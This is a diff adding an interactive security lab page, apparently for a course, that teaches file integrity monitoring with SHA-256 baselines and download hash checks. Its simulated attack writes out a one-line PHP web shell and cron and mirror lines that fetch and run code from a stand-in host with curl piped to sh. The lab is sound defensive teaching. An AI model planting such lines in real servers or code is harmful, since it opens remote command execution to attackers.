@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>5.6.a Lab, File Integrity Monitoring</title>
+<link rel="stylesheet" href="../../../assets/labs/lab.css">
+</head>
+<body>
+<div class="lab">
+  <h1>Lab, File Integrity Monitoring</h1>
+  <p class="sub">Record a known-good baseline, then let a hash catch files the attacker quietly changed.</p>
+
+  <div class="brief">
+    <p>Logs record what an application <i>did</i>; a file integrity monitor records what its files <i>are</i>.
+    Every hash below is computed by your browser's real <code>SHA-256</code> (Web Crypto). You will capture a
+    baseline digest of each server file, let an attacker tamper with some of them without telling you which,
+    and use the baseline to pinpoint exactly what changed. Then you will verify a downloaded file against the
+    publisher's posted hash, the same check you should run on any software you install.</p>
+  </div>
+
+  <p class="progress-line" id="progress">MISSIONS 0 / 3</p>
+  <ul class="missions" id="missions">
+    <li data-m="baseline"><span>Record the baseline SHA-256 of every file (the known-good state).</span>
+      <div class="hint"><details><summary>Hint</summary>Press <b>Record baseline</b>. A FIM tool stores these digests the moment the system is known clean, so any later change stands out.</details></div></li>
+    <li data-m="detect"><span>After the attacker strikes, scan and let the hashes reveal which files were tampered with.</span>
+      <div class="hint"><details><summary>Hint</summary>Press <b>Attacker strikes</b>, then <b>Scan now</b>. Any file whose current hash no longer matches its baseline is flagged CHANGED, even a one-character edit flips the entire digest.</details></div></li>
+    <li data-m="verify"><span>Verify a download against the publisher's posted hash, for both a clean and a tampered copy.</span>
+      <div class="hint"><details><summary>Hint</summary>Check the official download (its hash matches the posted value) and the mirror copy (its hash does not). A mismatch means the file was altered in transit or on the mirror.</details></div></li>
+  </ul>
+
+  <div class="grid2">
+    <div class="panel">
+      <h3>Server files</h3>
+      <p class="note">The real contents the monitor is watching. The attacker edits these directly.</p>
+      <div class="row">
+        <button class="primary" id="base">Record baseline</button>
+        <button id="attack">Attacker strikes</button>
+        <button id="scan">Scan now</button>
+      </div>
+      <div class="scroll">
+        <table class="data" id="tbl">
+          <thead><tr><th>file</th><th>baseline</th><th>current</th><th>status</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+      <div class="console" id="log" style="margin-top:10px"><span class="dim">Record a baseline to begin.</span></div>
+    </div>
+
+    <div class="panel">
+      <h3>Verify a download</h3>
+      <p class="note">Publisher posts this SHA-256 for <code>aayac-tools-2.4.1.tar.gz</code>:</p>
+      <div class="console" id="posted" style="min-height:40px"></div>
+      <div class="row">
+        <button id="official">Verify official download</button>
+        <button id="mirror">Verify mirror copy</button>
+      </div>
+      <div class="console" id="vout" style="margin-top:10px"><span class="dim">Compute a download's hash and compare it to the posted value.</span></div>
+    </div>
+  </div>
+
+  <div class="debrief" id="debrief">
+    <h2 style="margin-top:0">What integrity monitoring buys, and its limit</h2>
+    <p>A cryptographic hash is a fingerprint: change a single byte and the digest changes completely, so comparing
+    a file's current hash to a stored baseline reveals tampering that a casual look would miss, a web shell appended
+    to a page, a backdoor added to a cron job, a flipped config flag. The same check verifies that downloaded
+    software matches what the publisher released. The catch is twofold: FIM detects change only <i>after</i> it
+    happens, so it is a detective control, not a preventive one; and the baseline itself must be stored where the
+    attacker cannot also rewrite it, off-host or in append-only, tamper-evident storage, or the attacker simply
+    updates the baseline to match their altered file. This is the detection discipline behind LO 5.6.A.</p>
+  </div>
+</div>
+
+<script src="../../../assets/labs/lab.js"></script>
+<script>
+(function () {
+  var esc = Lab.esc, hex = Lab.hex, bytes = Lab.bytes;
+
+  function sha(text) { return crypto.subtle.digest("SHA-256", bytes(text)).then(hex); }
+  function short(h) { return h ? h.slice(0, 16) + "…" : "—"; }
+
+  var FILES = [
+    { path: "/etc/passwd", body: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" },
+    { path: "/var/www/index.php", body: "<?php\n  require 'config.php';\n  echo render_home();\n?>\n" },
+    { path: "/var/www/config.php", body: "<?php\n  $DEBUG = false;\n  $DB = 'app_prod';\n  $ALLOW_UPLOAD = false;\n?>\n" },
+    { path: "/usr/bin/backup.sh", body: "#!/bin/sh\ntar czf /backups/app.tgz /var/www\n" },
+    { path: "/etc/cron.d/jobs", body: "0 2 * * * root /usr/bin/backup.sh\n" },
+    { path: "/var/www/.htaccess", body: "Options -Indexes\nDeny from all\n" }
+  ];
+  var baseline = null;      // path -> hash at baseline time
+  var attacked = false;
+  var seen = { match: false, mismatch: false };
+
+  var missions = new Lab.Missions("5.6.a", document.getElementById("missions"),
+    document.getElementById("progress"), function () {
+      document.getElementById("debrief").classList.add("show");
+    });
+
+  function hashAll() {
+    return Promise.all(FILES.map(function (f) { return sha(f.body); }));
+  }
+
+  function render(currentHashes) {
+    var tb = document.querySelector("#tbl tbody");
+    tb.innerHTML = FILES.map(function (f, i) {
+      var b = baseline ? baseline[f.path] : null;
+      var c = currentHashes ? currentHashes[i] : null;
+      var status, cls;
+      if (!b) { status = "no baseline"; cls = ""; }
+      else if (!c) { status = "—"; cls = ""; }
+      else if (c === b) { status = "OK"; cls = "ok"; }
+      else { status = "CHANGED"; cls = "bad"; }
+      return "<tr><td>" + esc(f.path) + "</td><td>" + short(b) + "</td><td>" +
+        (c ? short(c) : "—") + "</td><td class='" + cls + "'>" + status + "</td></tr>";
+    }).join("");
+  }
+
+  document.getElementById("base").addEventListener("click", function () {
+    hashAll().then(function (hs) {
+      baseline = {};
+      FILES.forEach(function (f, i) { baseline[f.path] = hs[i]; });
+      render(hs);
+      document.getElementById("log").innerHTML =
+        '<span class="ok">baseline recorded for ' + FILES.length + ' files.</span>\n' +
+        '<span class="dim">this is the known-good state. tamper, then scan.</span>';
+      missions.complete("baseline");
+    });
+  });
+
+  document.getElementById("attack").addEventListener("click", function () {
+    // Tampering before the baseline would bake the attack into "known-good".
+    if (!baseline) {
+      document.getElementById("log").innerHTML = '<span class="err">record a baseline first, so you have a known-good state to compare against.</span>';
+      return;
+    }
+    // Silent tampering: a web shell, a cron backdoor, and an upload flag flipped on.
+    FILES[1].body = FILES[1].body.replace("?>\n", "  if(isset($_GET['c'])){system($_GET['c']);}\n?>\n");
+    FILES[4].body += "*/5 * * * * root curl -s http://198.51.100.9/x | sh\n";
+    FILES[2].body = FILES[2].body.replace("$ALLOW_UPLOAD = false;", "$ALLOW_UPLOAD = true;");
+    attacked = true;
+    document.getElementById("log").innerHTML =
+      '<span class="err">the attacker modified some files on disk.</span>\n' +
+      '<span class="dim">which ones? run a scan, the hashes will tell you.</span>';
+  });
+
+  document.getElementById("scan").addEventListener("click", function () {
+    if (!baseline) {
+      document.getElementById("log").innerHTML = '<span class="err">record a baseline first.</span>';
+      return;
+    }
+    hashAll().then(function (hs) {
+      render(hs);
+      var changed = FILES.filter(function (f, i) { return hs[i] !== baseline[f.path]; });
+      if (changed.length) {
+        document.getElementById("log").innerHTML =
+          '<span class="err">' + changed.length + ' file(s) CHANGED since baseline:</span>\n' +
+          changed.map(function (f) { return "  " + esc(f.path); }).join("\n");
+        if (attacked) missions.complete("detect");
+      } else {
+        document.getElementById("log").innerHTML =
+          '<span class="ok">all files match baseline. nothing tampered.</span>';
+      }
+    });
+  });
+
+  // ---- download verification -------------------------------------------
+  var OFFICIAL = "aayac-tools v2.4.1\nchecksum-ok payload\n-- official release build --\n";
+  var MIRROR = OFFICIAL.replace("-- official release build --", "-- official release build --\ncurl http://198.51.100.9/x | sh  # injected by mirror");
+  var postedHash = null;
+
+  sha(OFFICIAL).then(function (h) {
+    postedHash = h;
+    document.getElementById("posted").innerHTML = '<span class="q">' + esc(h) + '</span>';
+  });
+
+  function verifyDownload(body, label) {
+    sha(body).then(function (h) {
+      var ok = (h === postedHash);
+      if (ok) seen.match = true; else seen.mismatch = true;
+      document.getElementById("vout").innerHTML =
+        '<span class="dim">' + esc(label) + ' hash:</span> <span class="q">' + esc(h) + '</span>\n' +
+        '<span class="dim">posted hash:        </span> <span class="q">' + esc(postedHash) + '</span>\n\n' +
+        (ok ? '<span class="ok">MATCH, this copy is authentic.</span>'
+            : '<span class="err">MISMATCH, this copy was altered. Do not install it.</span>');
+      if (seen.match && seen.mismatch) missions.complete("verify");
+    });
+  }
+  document.getElementById("official").addEventListener("click", function () { verifyDownload(OFFICIAL, "official"); });
+  document.getElementById("mirror").addEventListener("click", function () { verifyDownload(MIRROR, "mirror"); });
+
+  render(null);
+})();
+</script>
+</body>
+</html>
